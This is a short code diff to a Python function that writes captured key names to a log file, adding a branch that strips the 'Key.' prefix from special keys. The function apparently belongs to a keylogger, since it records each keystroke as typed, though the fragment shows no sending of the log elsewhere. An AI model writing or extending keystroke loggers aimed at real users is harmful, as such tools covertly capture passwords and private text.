@@ -29,8 +29,14 @@ def write_file(keys):
             if k.find("space") > 0:
                 f.write('\n')
                 f.close()
+
+            # in the case of non-special characters, write them out as is
             elif k.find("Key") == -1:
                 f.write(k)
+                f.close()
+
+            else:
+                f.write(k.replace("Key.", ""))
                 f.close()
 
 
